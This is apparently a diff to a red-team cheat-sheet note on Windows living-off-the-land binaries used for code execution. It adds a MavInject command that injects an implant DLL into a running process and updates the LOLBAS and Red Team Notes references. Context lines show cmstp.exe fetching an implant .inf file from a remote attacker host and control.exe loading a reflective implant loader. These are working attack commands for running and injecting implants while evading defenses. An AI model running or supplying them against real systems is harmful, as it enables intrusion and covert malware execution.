@@ -135,8 +135,26 @@ C:\> cmstp.exe /ni /s http[s]://<IP>[:PORT]/implant.inf
 C:\> control.exe .\reflective_implant_loader.dll
 ```
 
+## MavInject
+
+Inject DLL implant in a process ID.
+
+```
+C:\> MavInject.exe <pid> /INJECTRUNNING C:\path\to\implant.dll
+```
+
 ---
 ## References
+
+### Backlinks
+
+- [[DLL Injection]]
+
+- [[DotNET Execution]]
+
+- [[Scriptlet]]
+
+- [[Advpack]]
 
 ### LOLBAS
 
@@ -152,14 +170,16 @@ C:\> control.exe .\reflective_implant_loader.dll
 
 - [LOLBAS: Control](https://lolbas-project.github.io/lolbas/Binaries/Control/)
 
+- [LOLBAS: Mavinject](https://lolbas-project.github.io/lolbas/Binaries/Mavinject/)
+
+- [LOLBAS: Setupapi](https://lolbas-project.github.io/lolbas/Libraries/Setupapi/)
+
+- [LOLBAS: leadvpack](https://lolbas-project.github.io/lolbas/Libraries/Ieadvpack/)
+
+- [LOLBAS: Certoc](https://lolbas-project.github.io/lolbas/Binaries/Certoc)
+
 ### Red Team Notes
 
-- [Red Team Notes: CMSTP](https://www.ired.team/offensive-security/code-execution/t1191-cmstp-code-execution)
+- [Red Team Notes: Control Panel Item](https://www.ired.team/offensive-security/code-execution/t1196-control-panel-item-code-execution)
 
-https://lolbas-project.github.io/lolbas/Libraries/Advpack/
-
-https://lolbas-project.github.io/lolbas/Libraries/Setupapi/
-
-https://lolbas-project.github.io/lolbas/Libraries/Ieadvpack/
-
-https://lolbas-project.github.io/lolbas/Binaries/Certoc
+- [Red Team Notes: Forcing `iexplore.exe` to Load a Malicious DLL via COM Abuse](https://www.ired.team/offensive-security/code-execution/forcing-iexplore.exe-to-load-a-malicious-dll-via-com-abuse)
